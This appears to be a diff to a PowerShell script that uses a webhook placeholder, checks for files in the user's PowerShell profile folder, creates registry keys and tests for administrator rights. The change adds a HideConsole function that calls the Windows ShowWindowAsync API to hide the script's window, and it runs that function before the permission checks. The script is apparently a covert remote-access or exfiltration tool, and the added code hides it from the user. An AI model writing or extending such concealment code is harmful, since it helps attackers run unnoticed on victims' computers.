@@ -18,6 +18,8 @@ if ($dc.Length -eq 0){
 $dc = "YOUR_WEBHOOK_HERE"
 }
 
+$hideWindow = 1 # 1 = Hidden
+
 [Console]::BackgroundColor = "Black"
 [Console]::SetWindowSize(60, 20)
 Clear-Host
@@ -27,6 +29,23 @@ $webhookUrl = "$dc"
 Test-Path $Profile
 $directory = Join-Path ([Environment]::GetFolderPath("MyDocuments")) WindowsPowerShell
 $ps1Files = Get-ChildItem -Path $directory -Filter *.ps1
+
+Function HideConsole{
+    If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if($hwnd -ne [System.IntPtr]::Zero){
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+        else{
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+    }
+}
 
 function CreateRegKeys {
     param ([string]$KeyPath)
@@ -58,6 +77,7 @@ if ($ps1Files.Count -gt 0) {
     exit
 }
 
+HideConsole
 Write-Host "Checking user permissions.." -ForegroundColor DarkGray
 
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
